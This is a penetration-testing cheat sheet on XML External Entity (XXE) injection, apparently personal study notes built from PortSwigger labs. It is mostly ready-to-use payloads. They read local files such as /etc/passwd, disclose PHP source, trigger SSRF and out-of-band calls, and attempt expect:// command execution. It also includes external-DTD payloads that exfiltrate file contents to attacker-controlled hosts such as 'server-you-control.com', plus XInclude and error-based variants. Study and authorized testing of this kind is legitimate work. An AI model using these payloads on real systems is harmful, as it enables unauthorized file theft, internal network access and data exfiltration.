## XML External Entity Injection (XXE)

### Why It Matters

XXE happens when an XML parser processes external entities unsafely. Depending on parser behavior, this can lead to:

- local file read
- blind out-of-band interaction
- SSRF
- source disclosure
- in rare cases, code execution through unsafe wrappers

### Recognition Cues

Look for features that accept:

- XML APIs
- SOAP
- SVG uploads
- office-style document imports
- SAML or XML-based integrations

Strong hints:

- `Content-Type: application/xml`
- XML parser errors
- user-controlled XML fields reflected in server responses

### Step 1: Entity Processing Test

Use a harmless internal entity first:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe "test"> ]>
<foo><bar>&xxe;</bar></foo>
```

If `test` appears in the response or processing result, the parser is likely resolving entities.

### Step 2: Local File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo><bar>&xxe;</bar></foo>
```

Useful targets:

- `/etc/passwd`
- application config files
- `C:\Windows\win.ini`
- source or secret-bearing files

### Step 3: Blind XXE

If nothing is reflected, use an out-of-band interaction:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://collaborator"> ]>
<foo><bar>&xxe;</bar></foo>
```

Parameter entity variant:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://collaborator"> %xxe; ]>
```

This helps prove parser interaction even without visible output.

### Source Disclosure With PHP Filters

If the backend is PHP and wrappers are enabled:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=db.php"> ]>
<foo><bar>&xxe;</bar></foo>
```

This is often more valuable than plain file read because it exposes raw source code.

### External DTD And Exfiltration

An external DTD may help with blind exfiltration:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://our-site.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Use this when the target parser blocks direct reflection but still resolves external entities.

### Rare Escalation Cases

Some environments allow dangerous wrappers:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>
<foo><bar>&xxe;</bar></foo>
```

This is highly environment-dependent and not the default expectation.

### Where XXE Often Hides

- SOAP backends
- file upload handling for SVG
- XML import/export
- Java applications with legacy XML parsers
## XXE Payloads

**If the application <u>is returning</u> the values of the defined external entities in its response, we can try the following techniques:**
### File Retrieval

* Inject the following payload in the body of the request on the target application:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

* Then use the defined xxe entity in an xml value in the request:

```xml
&xxe;
```

* We may be able to see the contents of the /etc/passwd file in the response.
### In-band SSRF

* Inject the following payload in the body of the request on the target application:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

* Then use the defined xxe entity in an xml value in the request:

```xml
&xxe;
```

* We may be able to see the HTTP response returned from the internal website.

### Example:  XXE Injection Attack

* The XML value in \<productId\> is being reflected in the response when an error is triggered so this was a good target for in-band XXE injection.

* The below is an example payload for XXE injection:

**If the application <u>is not returning</u> the values of the defined external entities in its response, we need to use Blind Payload Techniques:**

### Blind XXE to a server you control

* Inject the following payload in the body of the request on the target application:


```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://server-you-control.com"> ]>
```

* Then use the defined xxe entity in an xml value in the request:

```xml
&xxe;
```

* Check your server logs for any network traffic.


<br>

### Blind XXE to a server you control, when regular external entities are blocked (use parameter entities):

* Inject the following payload in the body of the request on the target application:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://server-you-control.com"> %xxe; ]>
```

* Here the xxe parameter entity needs to be referenced “within” the DOCTYPE.

* Check your server logs for any network traffic.
### Example:  XXE Injection Parameter Entities

### Blind XXE to exfiltrate data – malicious external DTD

* Host the following code in a .dtd file on your server:  (Change the targeted file as needed.)

* This will cause the application to issue a request to the attacker's server, appending the contents of the /etc/passwd file as a query parameter.

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://server-you-control.com/?x=%file;'>">
%eval;
%exfiltrate;
```

* Now inject the following payload in the body of the request on the target application:  (Note: The file on your server needs to be called "malicious.dtd")

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://server-you-control.com/malicious.dtd"> %xxe;]>
```
### Blind XXE to exfiltrate data – external DTD via error messages

* Host the following code in a .dtd file on your server, the “nonexistent” file will cause an error message, and the stack trace will include the contents of the /etc/passwd in the HTTP response of the target application:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

* Inject the following payload in the body of the request on the target application: (Note: The file on your server needs to be called "malicious.dtd")

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

### Blind XXE – repurpose a local DTD

* https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-by-repurposing-a-local-dtd
### Hidden Attack Surface – XInclude Attacks

* Inject the following payload in the body of the request on the target application: 

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

* Payload Example: (URL encoding is required on appropriate characters to work properly in POST request.)

```
productId=1<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
```
### Hidden Attack Surface – File Upload

* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xxe-in-exotic-files

* https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload

* To identify this vulnerability:

   * Set the file extension to .svg
 
   * Include a \<svg\> parameter in the request body where the file's contents go 
### Change Content Type of Request

* Change the content type and body of the request to XML type and analyze if the application still processes the request correctly.  If it does, then we can try XXE payloads.

    * Example:  foo=bar

```xml
<?xml version="1.0" encoding="UTF-8"?>
<foo>bar</foo>
```
### Pending to complete labs that are missing from cheat sheet:

* All labs in this category are completed and referenced in cheat sheet.